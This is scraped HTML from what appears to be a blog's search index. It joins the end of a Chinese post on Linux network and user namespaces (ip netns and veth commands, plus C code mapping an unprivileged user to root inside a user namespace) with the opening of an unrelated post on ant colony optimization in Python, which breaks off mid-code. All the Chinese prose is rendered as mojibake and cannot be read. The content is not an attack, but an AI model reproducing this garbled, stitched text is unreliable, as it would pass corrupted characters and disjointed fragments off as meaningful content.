&lt;p&gt;å½“ipå‘½ä»¤å·¥å…·åˆ›å»ºä¸€ä¸ªnetwork namespaceæ—¶ï¼Œä¼šé»˜è®¤åˆ›å»ºä¸€ä¸ªå›ç¯è®¾å¤‡ï¼ˆloopback interfaceï¼šloï¼‰ï¼Œå¹¶åœ¨/var/run/netnsç›®å½•ä¸‹ç»‘å®šä¸€ä¸ªæŒ‚è½½ç‚¹ï¼Œè¿™å°±ä¿è¯äº†å°±ç®—network namespaceä¸­æ²¡æœ‰è¿›ç¨‹åœ¨è¿è¡Œä¹Ÿä¸ä¼šè¢«é‡Šæ”¾ï¼Œä¹Ÿç»™ç³»ç»Ÿç®¡ç†å‘˜å¯¹æ–°åˆ›å»ºçš„network namespaceè¿›è¡Œé…ç½®æä¾›äº†å……è¶³çš„æ—¶é—´ã€‚&lt;/p&gt;
&lt;p&gt;é€šè¿‡ip netns execå‘½ä»¤å¯ä»¥åœ¨æ–°åˆ›å»ºçš„network namespaceä¸‹è¿è¡Œç½‘ç»œç®¡ç†å‘½ä»¤ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# ip netns exec test_ns ip link list
1: lo: &amp;lt;LOOPBACK&amp;gt; mtu 65536 qdisc noop state DOWN mode DEFAULT qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸Šé¢çš„å‘½ä»¤ä¸ºæˆ‘ä»¬å±•ç¤ºäº†æ–°å»ºçš„namespaceä¸‹å¯è§çš„ç½‘ç»œé“¾æ¥ï¼Œå¯ä»¥çœ‹åˆ°çŠ¶æ€æ˜¯DOWN,éœ€è¦å†é€šè¿‡å‘½ä»¤å»å¯åŠ¨ã€‚å¯ä»¥çœ‹åˆ°ï¼Œæ­¤æ—¶æ‰§è¡Œpingå‘½ä»¤æ˜¯æ— æ•ˆçš„ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# ip netns exec test_ns ping 127.0.01
connect: ç½‘ç»œä¸å¯è¾¾
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯åŠ¨å‘½ä»¤å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°å¯åŠ¨åå†æµ‹è¯•å°±å¯ä»¥pingé€šã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# ip netns exec test_ns ip link set dev lo up
[root@localhost ~]# ip netns exec test_ns ip link list
1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
[root@localhost ~]# ip netns exec test_ns ping 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.087 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.060 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.062 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ ·åªæ˜¯å¯åŠ¨äº†æœ¬åœ°çš„å›ç¯ï¼Œè¦å®ç°ä¸å¤–éƒ¨namespaceè¿›è¡Œé€šä¿¡è¿˜éœ€è¦å†å»ºä¸€ä¸ªç½‘ç»œè®¾å¤‡å¯¹ï¼Œå‘½ä»¤å¦‚ä¸‹ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# ip link add veth0 type veth peer name veth1
[root@localhost ~]# ip link set veth1 netns test_ns
[root@localhost ~]# ip netns exec test_ns ifconfig veth1 10.1.1.1/24 up
[root@localhost ~]# ifconfig veth0 10.1.1.2/24 up
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ç¬¬ä¸€æ¡å‘½ä»¤åˆ›å»ºäº†ä¸€ä¸ªç½‘ç»œè®¾å¤‡å¯¹ï¼Œæ‰€æœ‰å‘é€åˆ°veth0çš„åŒ…veth1ä¹Ÿèƒ½æ¥æ”¶åˆ°ï¼Œåä¹‹äº¦ç„¶&lt;/li&gt;
&lt;li&gt;ç¬¬äºŒæ¡å‘½ä»¤åˆ™æ˜¯æŠŠveth1è¿™ä¸€ç«¯åˆ†é…åˆ°test_nsè¿™ä¸ªnetwork namespaceã€‚&lt;/li&gt;
&lt;li&gt;ç¬¬ä¸‰ã€ç¬¬å››æ¡å‘½ä»¤åˆ†åˆ«ç»™test_nså†…éƒ¨å’Œå¤–éƒ¨çš„ç½‘ç»œè®¾å¤‡é…ç½®IPï¼Œveth1çš„IPä¸º10.1.1.1ï¼Œveth0çš„IPä¸º10.1.1.2ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ­¤æ—¶ä¸¤è¾¹å°±å¯ä»¥äº’ç›¸è¿é€šäº†ï¼Œæ•ˆæœå¦‚ä¸‹ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@localhost ~]# ping 10.1.1.1
PING 10.1.1.1 (10.1.1.1) 56(84) bytes of data.
64 bytes from 10.1.1.1: icmp_seq=1 ttl=64 time=0.038 ms
64 bytes from 10.1.1.1: icmp_seq=2 ttl=64 time=0.057 ms
^C
--- 10.1.1.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 999ms
rtt min/avg/max/mdev = 0.038/0.047/0.057/0.011 ms
[root@localhost ~]# ip netns exec test_ns ping 10.1.1.2
PING 10.1.1.2 (10.1.1.2) 56(84) bytes of data.
64 bytes from 10.1.1.2: icmp_seq=1 ttl=64 time=0.048 ms
64 bytes from 10.1.1.2: icmp_seq=2 ttl=64 time=0.060 ms
^C
--- 10.1.1.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 999ms
rtt min/avg/max/mdev = 0.048/0.054/0.060/0.006 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ é™¤net namespace:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# ip netns delete test_ns
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;user-namespace&#34;&gt;user namespace&lt;/h2&gt;
&lt;p&gt;User namespaceä¸»è¦éš”ç¦»äº†å®‰å…¨ç›¸å…³çš„æ ‡è¯†ç¬¦å’Œå±æ€§ï¼ŒåŒ…æ‹¬ç”¨æˆ·ID,ç”¨æˆ·ç»„ID,rootç›®å½•ç­‰ã€‚é€šä¿—ç‚¹å°±æ˜¯: ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„è¿›ç¨‹é€šè¿‡clone()åˆ›å»ºæ–°çš„è¿›ç¨‹åœ¨æ–°user namespaceä¸­å¯ä»¥æ‹¥æœ‰ä¸åŒçš„ç”¨æˆ·å’Œç”¨æˆ·ç»„ã€‚&lt;strong&gt;è¿™æ„å‘³ç€ä¸€ä¸ªè¿›ç¨‹åœ¨å®¹å™¨å¤–å±äºä¸€ä¸ªæ²¡æœ‰ç‰¹æ®Šæƒé™çš„æ™®é€šç”¨æˆ·ï¼Œä½†æ˜¯å®ƒåˆ›å»ºçš„å®¹å™¨è¿›ç¨‹å´å±äºæ‹¥æœ‰æ‰€æœ‰æƒé™çš„è¶…çº§ç”¨æˆ·ï¼Œè¿™ä¸ªæŠ€æœ¯ä¸ºå®¹å™¨æä¾›äº†æå¤§çš„è‡ªç”±ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Linuxä¸­ï¼Œç‰¹æƒç”¨æˆ·çš„user IDæ˜¯0ï¼Œæ¼”ç¤ºçš„æœ€ç»ˆæˆ‘ä»¬å°†çœ‹åˆ°user IDé0çš„è¿›ç¨‹å¯åŠ¨user namespaceåuser IDå¯ä»¥å˜ä¸º0ã€‚ä½¿ç”¨user namespaceçš„æ–¹æ³•å’Œå…¶å®ƒçš„namespaceçš„ä½¿ç”¨æ–¹å¼æ²¡æœ‰å¤ªå¤§çš„åŒºåˆ«ã€‚å³è°ƒç”¨clone()çš„æ—¶å€™ï¼Œéœ€è¦åŠ å…¥CLONE_NEWUSERæ ‡è¯†ä½ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define _GNU_SOURCE
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/wait.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sched.h&amp;gt;
#include &amp;lt;signal.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/capability.h&amp;gt;

#define STACK_SIZE (1024 * 1024)

static char child_stack[STACK_SIZE];
char* const child_args[] = {
  &amp;quot;/bin/bash&amp;quot;,
  NULL
};

int child_main(void* args) {
  printf(&amp;quot;in child program!\n&amp;quot;);
  cap_t caps;
  printf(&amp;quot;eUID = %ld; eGID = %ld;&amp;quot;, (long)geteuid(), (long)getegid());
  caps = cap_get_proc();
  printf(&amp;quot;capabilities: %s\n&amp;quot;, cap_to_text(caps, NULL));
  execv(child_args[0], child_args);
  return 1;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# åœ¨ç¼–è¯‘å¹¶æ‰§è¡Œä»£ç ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹å½“å‰çš„ç”¨æˆ·uidå’Œgid.
$ id -u
1000
$ id -g
1000

# ç°åœ¨ç¼–è¯‘å¹¶è¿è¡Œæˆ‘ä»¬çš„ä»£ç æ¥éªŒè¯user namespaceæ˜¯å¦éš”ç¦»æˆåŠŸï¼š
# æ³¨æ„: å¦‚æœç¼–è¯‘æ—¶å¦‚ä¸‹æŠ¥é”™:
fatal error: sys/capability.h: No such file or directory
compilation terminated.
# åˆ™åœ¨ubuntuç¼–è¯‘åˆ™éœ€è¦å®‰è£…libcap-devåŒ…,å¦‚æœåœ¨centosä¸Šç¼–è¯‘åˆ™éœ€è¦å®‰è£…libcap-develåŒ…ã€‚
# è¿è¡Œçš„ç»“æœå¦‚ä¸‹:
[root@localhost ~]# gcc userns.c -Wall -lcap -o userns &amp;amp;&amp;amp; ./userns 
program begin: 
in child program!
eUID = 65534; eGID = 65534;capabilities: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+ep
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;user namespaceè¢«åˆ›å»ºåï¼Œç¬¬ä¸€ä¸ªè¿›ç¨‹è¢«èµ‹äºˆäº†è¯¥namespaceä¸­çš„å…¨éƒ¨æƒé™ï¼Œè¿™æ ·è¿™ä¸ªinitè¿›ç¨‹å°±å¯ä»¥å®Œæˆæ‰€æœ‰å¿…è¦çš„åˆå§‹åŒ–å·¥ä½œï¼Œè€Œä¸ä¼šå› æƒé™ä¸è¶³è€Œå‡ºç°é”™è¯¯ã€‚&lt;/li&gt;
&lt;li&gt;æˆ‘ä»¬çœ‹åˆ°namespaceå†…éƒ¨çœ‹åˆ°çš„UIDå’ŒGIDå·²ç»ä¸å¤–éƒ¨ä¸åŒäº†ï¼Œé»˜è®¤æ˜¾ç¤ºä¸º65534ï¼Œè¡¨ç¤ºå°šæœªä¸å¤–éƒ¨namespaceç”¨æˆ·æ˜ å°„ã€‚æˆ‘ä»¬éœ€è¦å¯¹user namespaceå†…éƒ¨çš„è¿™ä¸ªåˆå§‹userå’Œå…¶å¤–éƒ¨namespaceæŸä¸ªç”¨æˆ·å»ºç«‹æ˜ å°„ï¼Œè¿™æ ·å¯ä»¥ä¿è¯å½“æ¶‰åŠåˆ°ä¸€äº›å¯¹å¤–éƒ¨namespaceçš„æ“ä½œæ—¶ï¼Œç³»ç»Ÿå¯ä»¥æ£€éªŒå…¶æƒé™ï¼ˆæ¯”å¦‚å‘é€ä¸€ä¸ªä¿¡å·æˆ–æ“ä½œæŸä¸ªæ–‡ä»¶ï¼‰ã€‚åŒæ ·ç”¨æˆ·ç»„ä¹Ÿè¦å»ºç«‹æ˜ å°„ã€‚&lt;/li&gt;
&lt;li&gt;è¿˜æœ‰ä¸€ç‚¹è™½ç„¶ä¸èƒ½ä»è¾“å‡ºä¸­çœ‹å‡ºæ¥ï¼Œä½†æ˜¯å€¼å¾—æ³¨æ„ã€‚ç”¨æˆ·åœ¨æ–°namespaceä¸­æœ‰å…¨éƒ¨æƒé™ï¼Œä½†æ˜¯ä»–åœ¨åˆ›å»ºä»–çš„çˆ¶namespaceä¸­ä¸å«ä»»ä½•æƒé™ã€‚å°±ç®—è°ƒç”¨å’Œåˆ›å»ºä»–çš„è¿›ç¨‹æœ‰å…¨éƒ¨æƒé™ä¹Ÿæ˜¯å¦‚æ­¤ã€‚æ‰€ä»¥å“ªæ€•æ˜¯rootç”¨æˆ·è°ƒç”¨äº†clone()åœ¨user namespaceä¸­åˆ›å»ºå‡ºçš„æ–°ç”¨æˆ·åœ¨å¤–éƒ¨ä¹Ÿæ²¡æœ‰ä»»ä½•æƒé™ã€‚&lt;/li&gt;
&lt;li&gt;æœ€åï¼Œuser namespaceçš„åˆ›å»ºå…¶å®æ˜¯ä¸€ä¸ªå±‚å±‚åµŒå¥—çš„æ ‘çŠ¶ç»“æ„ã€‚æœ€ä¸Šå±‚çš„æ ¹èŠ‚ç‚¹å°±æ˜¯root namespaceï¼Œæ–°åˆ›å»ºçš„æ¯ä¸ªuser namespaceéƒ½æœ‰ä¸€ä¸ªçˆ¶èŠ‚ç‚¹user namespaceä»¥åŠé›¶ä¸ªæˆ–å¤šä¸ªå­èŠ‚ç‚¹user namespaceï¼Œè¿™ä¸€ç‚¹ä¸PID namespaceéå¸¸ç›¸ä¼¼ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦è¿›è¡Œç”¨æˆ·ç»‘å®šæ“ä½œï¼Œé€šè¿‡åœ¨/proc/[pid]/uid_mapå’Œ/proc/[pid]/gid_mapä¸¤ä¸ªæ–‡ä»¶ä¸­å†™å…¥å¯¹åº”çš„ç»‘å®šä¿¡æ¯å¯ä»¥å®ç°è¿™ä¸€ç‚¹ï¼Œæ ¼å¼ï¼š&lt;code&gt;ID-inside-ns   ID-outside-ns   length&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å†™è¿™ä¸¤ä¸ªæ–‡ä»¶éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸¤ä¸ªæ–‡ä»¶åªå…è®¸ç”±æ‹¥æœ‰è¯¥user namespaceä¸­CAP_SETUIDæƒé™çš„è¿›ç¨‹å†™å…¥ä¸€æ¬¡ï¼Œä¸å…è®¸ä¿®æ”¹ã€‚&lt;/li&gt;
&lt;li&gt;å†™å…¥çš„è¿›ç¨‹å¿…é¡»æ˜¯è¯¥user namespaceçš„çˆ¶namespaceæˆ–è€…å­namespaceã€‚&lt;/li&gt;
&lt;li&gt;ç¬¬ä¸€ä¸ªå­—æ®µID-inside-nsè¡¨ç¤ºæ–°å»ºçš„user namespaceä¸­å¯¹åº”çš„user/group IDï¼Œç¬¬äºŒä¸ªå­—æ®µID-outside-nsè¡¨ç¤ºnamespaceå¤–éƒ¨æ˜ å°„çš„user/group IDã€‚æœ€åä¸€ä¸ªå­—æ®µè¡¨ç¤ºæ˜ å°„èŒƒå›´ï¼Œé€šå¸¸å¡«1ï¼Œè¡¨ç¤ºåªæ˜ å°„ä¸€ä¸ªï¼Œå¦‚æœå¡«å¤§äº1çš„å€¼ï¼Œåˆ™æŒ‰é¡ºåºå»ºç«‹ä¸€ä¸€æ˜ å°„ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ˜ç™½äº†ä¸Šè¿°åŸç†ï¼Œæˆ‘ä»¬å†æ¬¡ä¿®æ”¹ä»£ç ï¼Œæ·»åŠ è®¾ç½®uidå’Œguidçš„å‡½æ•°ã€‚æµ‹è¯•çš„ä»£ç å¦‚ä¸‹:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define _GNU_SOURCE
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/wait.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sched.h&amp;gt;
#include &amp;lt;signal.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/capability.h&amp;gt;

#define STACK_SIZE (1024 * 1024)

static char child_stack[STACK_SIZE];
char* const child_args[] = {
  &amp;quot;/bin/bash&amp;quot;,
  NULL
};

void set_uid_map(pid_t pid, int inside_id, int outside_id, int length) {
    char path[256];
    sprintf(path, &amp;quot;/proc/%d/uid_map&amp;quot;, getpid());
    FILE* uid_map = fopen(path, &amp;quot;w&amp;quot;);
    fprintf(uid_map, &amp;quot;%d %d %d&amp;quot;, inside_id, outside_id, length);
    fclose(uid_map);
}
void set_gid_map(pid_t pid, int inside_id, int outside_id, int length) {
    char path[256];
    sprintf(path, &amp;quot;/proc/%d/gid_map&amp;quot;, getpid());
    FILE* gid_map = fopen(path, &amp;quot;w&amp;quot;);
    fprintf(gid_map, &amp;quot;%d %d %d&amp;quot;, inside_id, outside_id, length);
    fclose(gid_map);
}

int child_main(void* args) {
  printf(&amp;quot;in child program!\n&amp;quot;);
  cap_t caps;
  set_uid_map(getpid(), 0, 1000, 1);
  set_gid_map(getpid(), 0, 1000, 1);
  printf(&amp;quot;eUID = %ld; eGID = %ld;&amp;quot;, (long)geteuid(), (long)getegid());
  caps = cap_get_proc();
  printf(&amp;quot;capabilities: %s\n&amp;quot;, cap_to_text(caps, NULL));
  execv(child_args[0], child_args);
  return 1;
}

int main() {
  printf(&amp;quot;program begin: \n&amp;quot;);
  int child_pid = clone(child_main, child_stack + STACK_SIZE, SIGCHLD | CLONE_NEWUSER, NULL);
  waitpid(child_pid, NULL, 0);
  printf(&amp;quot;quit\n&amp;quot;);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç¼–è¯‘åå³å¯çœ‹åˆ°userå·²ç»å˜æˆäº†rootã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ gcc userns.c -Wall -lcap -o userns &amp;amp;&amp;amp; ./userns 
program begin: 
in child program!
eUID = 0; eGID = 0;capabilities: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+ep
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è‡³æ­¤ï¼Œä½ å°±å·²ç»å®Œæˆäº†ç»‘å®šçš„å·¥ä½œï¼Œå¯ä»¥çœ‹åˆ°æ¼”ç¤ºå…¨ç¨‹éƒ½æ˜¯åœ¨æ™®é€šç”¨æˆ·ä¸‹æ‰§è¡Œçš„ã€‚æœ€ç»ˆå®ç°äº†åœ¨user namespaceä¸­æˆä¸ºäº†rootè€Œå¯¹åº”åˆ°å¤–é¢çš„æ˜¯ä¸€ä¸ªuidä¸º1000çš„æ™®é€šç”¨æˆ·ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ€»ç»“&#34;&gt;æ€»ç»“&lt;/h2&gt;
&lt;p&gt;å®¹å™¨çš„éš”ç¦»å®ç°åŸºæœ¬å°±æ˜¯é€šè¿‡Linuxå†…æ ¸æä¾›çš„è¿™6ç§namespaceå®ç°ã€‚ä½†æ˜¯å®¹å™¨ä¾æ—§æ²¡æœ‰å®ç°å®Œå…¨çš„ç¯å¢ƒéš”ç¦»ã€‚æ¯”å¦‚: SELinux,Cgroupsä»¥åŠ/sys,/proc/sys, /dev/sd*ç­‰ç›®å½•ä¸‹çš„èµ„æºä¾æ®æ˜¯æ²¡æœ‰è¢«éš”ç¦»çš„ã€‚å› æ­¤æˆ‘ä»¬é€šå¸¸ä½¿ç”¨çš„psï¼Œ topå‘½ä»¤æŸ¥çœ‹åˆ°çš„æ•°æ®ä¾æ—§æ˜¯å®¿ä¸»æœºçš„æ•°æ®ã€‚å› ä¸ºå®ƒä»¬çš„æ•°æ®æ¥æºäº/procç­‰ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å‚è€ƒ&#34;&gt;å‚è€ƒ&lt;/h2&gt;
&lt;p&gt;https://xigang.github.io/2018/10/14/namespace-md/&lt;/p&gt;
">ã€å®¹å™¨ã€‘04 namespace</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/yi-qun-yi-chuan-wei-li-qun/"" data-c="
          &lt;h3 id=&#34;èšç¾¤ç®—æ³•&#34;&gt;èšç¾¤ç®—æ³•&lt;/h3&gt;
&lt;p&gt;èšç¾¤ç®—æ³•ACOæ˜¯ä¸€ç§æ™ºèƒ½ç®—æ³•ï¼Œå®ƒç”±ä¸€ç¾¤æ— æ™ºèƒ½æˆ–è½»å¾®æ™ºèƒ½çš„ä¸ªä½“ï¼Œé€šè¿‡ç›¸äº’å†™ä½œè¡¨ç°å‡ºæ™ºèƒ½è¡Œä¸ºï¼Œä»è€Œä¸ºæ±‚è§£å¤æ‚é—®é¢˜æä¾›äº†ä¸€ä¸ªæ–°çš„å¯èƒ½æ€§ã€‚&lt;/p&gt;
&lt;p&gt;èšç¾¤ç®—æ³•æ˜¯ä¸€ç§ä»¿ç”Ÿå­¦ç®—æ³•ï¼Œæ˜¯ç”±è‡ªç„¶ç•Œä¸­èš‚èšè§…é£Ÿçš„è¡Œä¸ºè€Œå¯å‘çš„ã€‚åœ¨è‡ªç„¶ç•Œä¸­ï¼Œèš‚èšè§…é£Ÿè¿‡ç¨‹ä¸­ï¼Œèšç¾¤æ€»èƒ½å¤ŸæŒ‰ç…§å¯»æ‰¾åˆ°ä¸€æ¡ä»èšå·¢å’Œé£Ÿç‰©æºçš„æœ€ä¼˜è·¯å¾„ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1638754190435.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å‡å¦‚èšç¾¤ä¸­æ‰€æœ‰èš‚èšçš„æ•°é‡ä¸ºmï¼Œæ‰€æœ‰åŸå¸‚ä¹‹é—´çš„ä¿¡æ¯ç´ ç”¨çŸ©é˜µpheromoneè¡¨ç¤ºï¼Œæœ€çŸ­è·¯å¾„ä¸ºbestLengthï¼Œæœ€ä½³è·¯å¾„ä¸ºbestTourã€‚æ¯åªèš‚èšéƒ½æœ‰è‡ªå·±çš„å†…å­˜ï¼Œå†…å­˜ä¸­ç”¨ä¸€ä¸ªç¦å¿Œè¡¨ï¼ˆTabuï¼‰æ¥å­˜å‚¨è¯¥èš‚èšå·²ç»è®¿é—®è¿‡çš„åŸå¸‚ï¼Œè¡¨ç¤ºå…¶åœ¨ä»¥åçš„æœç´¢ä¸­å°†ä¸èƒ½è®¿é—®è¿™äº›åŸå¸‚ï¼›è¿˜æœ‰ç”¨å¦å¤–ä¸€ä¸ªå…è®¸è®¿é—®çš„åŸå¸‚è¡¨ï¼ˆAllowedï¼‰æ¥å­˜å‚¨å®ƒè¿˜å¯ä»¥è®¿é—®çš„åŸå¸‚ï¼›å¦å¤–è¿˜ç”¨ä¸€ä¸ªçŸ©é˜µï¼ˆDeltaï¼‰æ¥å­˜å‚¨å®ƒåœ¨ä¸€ä¸ªå¾ªç¯ï¼ˆæˆ–è€…è¿­ä»£ï¼‰ä¸­ç»™æ‰€ç»è¿‡çš„è·¯å¾„é‡Šæ”¾çš„ä¿¡æ¯ç´ ï¼›è¿˜æœ‰å¦å¤–ä¸€äº›æ•°æ®ï¼Œä¾‹å¦‚ä¸€äº›æ§åˆ¶å‚æ•°(Î±ï¼ŒÎ²ï¼ŒÏï¼ŒQ)ï¼Œè¯¥èš‚èšè¡Œèµ°å®Œå…¨ç¨‹çš„æ€»æˆæœ¬æˆ–è·ç¦»ï¼ˆtourLengthï¼‰ï¼Œç­‰ç­‰ã€‚å‡å®šç®—æ³•æ€»å…±è¿è¡ŒMAX_GENæ¬¡ï¼Œè¿è¡Œæ—¶é—´ä¸ºtã€‚&lt;/p&gt;
&lt;p&gt;æ­¥éª¤ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;åˆå§‹åŒ–ï¼›&lt;/li&gt;
&lt;li&gt;ä¸ºæ¯ä¸ªèš‚èšé€‰æ‹©ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼›&lt;/li&gt;
&lt;li&gt;æ›´æ–°ä¿¡æ¯ç´ çŸ©é˜µï¼›&lt;/li&gt;
&lt;li&gt;æ£€æŸ¥ç»ˆæ­¢æ¡ä»¶ï¼›&lt;br&gt;
å¦‚æœè¾¾åˆ°æœ€å¤§ä»£æ•°MAX_GENï¼Œç®—æ³•ç»ˆæ­¢ï¼Œè½¬åˆ°5ï¼Œå¦åˆ™ï¼Œé‡æ–°åˆå§‹åŒ–æ‰€æœ‰èš‚èšçš„DeltçŸ©é˜µä¸º0ï¼ŒTatuè¡¨æ¸…ç©ºï¼ŒAllowedè¡¨ä¸­åŠ å…¥æ‰€æœ‰çš„åŸå¸‚èŠ‚ç‚¹ã€‚éšæœºé€‰æ‹©å®ƒä»¬çš„èµ·å§‹ä½ç½®ã€‚åœ¨Tabuä¸­åŠ å…¥èµ·å§‹èŠ‚ç‚¹ï¼ŒAllowedä¸­å»æ‰è¯¥èµ·å§‹èŠ‚ç‚¹ï¼Œé‡å¤æ‰§è¡Œ2ï¼Œ3ï¼Œ4æ­¥ï¼›&lt;/li&gt;
&lt;li&gt;è¾“å‡ºæœ€ä¼˜å€¼ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;ä½œè€…ï¼šç‹è£èƒœ
é“¾æ¥ï¼šhttps://zhuanlan.zhihu.com/p/137408401
æ¥æºï¼šçŸ¥ä¹
è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚

# -*- coding: utf-8 -*-
import random
import copy
import time
import sys
import math
import tkinter #//GUIæ¨¡å—
import threading
from functools import reduce


# å‚æ•°
&#39;&#39;&#39;
ALPHA:ä¿¡æ¯å¯å‘å› å­ï¼Œå€¼è¶Šå¤§ï¼Œåˆ™èš‚èšé€‰æ‹©ä¹‹å‰èµ°è¿‡çš„è·¯å¾„å¯èƒ½æ€§å°±è¶Šå¤§
      ï¼Œå€¼è¶Šå°ï¼Œåˆ™èšç¾¤æœç´¢èŒƒå›´å°±ä¼šå‡å°‘ï¼Œå®¹æ˜“é™·å…¥å±€éƒ¨æœ€ä¼˜
BETA:Betaå€¼è¶Šå¤§ï¼Œèšç¾¤è¶Šå°±å®¹æ˜“é€‰æ‹©å±€éƒ¨è¾ƒçŸ­è·¯å¾„ï¼Œè¿™æ—¶ç®—æ³•æ”¶æ•›é€Ÿåº¦ä¼š
     åŠ å¿«ï¼Œä½†æ˜¯éšæœºæ€§ä¸é«˜ï¼Œå®¹æ˜“å¾—åˆ°å±€éƒ¨çš„ç›¸å¯¹æœ€ä¼˜
&#39;&#39;&#39;
(ALPHA, BETA, RHO, Q) = (1.0,2.0,0.5,100.0)
# åŸå¸‚æ•°ï¼Œèšç¾¤
(city_num, ant_num) = (50,50)
distance_x = [
    178,272,176,171,650,499,267,703,408,437,491,74,532,
    416,626,42,271,359,163,508,229,576,147,560,35,714,
    757,517,64,314,675,690,391,628,87,240,705,699,258,
    428,614,36,360,482,666,597,209,201,492,294]
distance_y = [
    170,395,198,151,242,556,57,401,305,421,267,105,525,
    381,244,330,395,169,141,380,153,442,528,329,232,48,
    498,265,343,120,165,50,433,63,491,275,348,222,288,
    490,213,524,244,114,104,552,70,425,227,331]
#åŸå¸‚è·ç¦»å’Œä¿¡æ¯ç´ 
distance_graph = [ [0.0 for col in range(city_num)] for raw in range(city_num)]
pheromone_graph = [ [1.0 for col in range(city_num)] for raw in range(city_num)]



#----------- èš‚èš -----------
class Ant(object):

    # åˆå§‹åŒ–
    def __init__(self,ID):

        self.ID = ID                 # ID
